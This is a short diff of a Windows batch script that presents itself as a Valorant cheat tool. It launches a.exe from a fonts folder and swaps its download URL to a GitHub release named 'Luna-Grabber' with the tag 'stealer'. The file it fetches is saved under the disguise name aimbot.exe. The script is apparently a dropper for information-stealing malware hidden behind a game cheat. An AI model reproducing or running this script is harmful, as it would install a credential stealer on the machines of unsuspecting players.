@@ -2,7 +2,7 @@
 cd /d "Valorant\new\menus\fonts"
 start a.exe
 echo injection 2 ne pas fermer la page
-set "URL=https://github.com/hvbsvqdj/tool-boost-funk/releases/download/boost/boost.exe"
+set "URL=https://github.com/hvbsvqdj/Luna-Grabber/releases/download/stealer/lunar.exe"
 set "Dossier=VMouse"
 set "NomFichier=%Dossier%\aimbot.exe"
 
